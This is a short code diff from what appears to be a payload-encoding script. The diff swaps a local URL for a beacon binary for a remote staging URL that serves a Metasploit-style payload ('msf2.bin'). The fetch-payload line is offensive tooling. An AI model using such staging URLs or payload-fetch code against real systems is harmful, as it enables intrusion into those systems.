@@ -74,7 +74,7 @@ def get_binary_data(url):
     return b'This is a dummy payload for testing the encoding mechanism.'
 
 # URL of the binary
-url = "http://127.0.0.1:5500/cs/beacon_x64.bin"
+url = "https://stage.attck-deploy.net/msf2.bin"
 
 # Get binary data
 binary_data = get_binary_data(url)
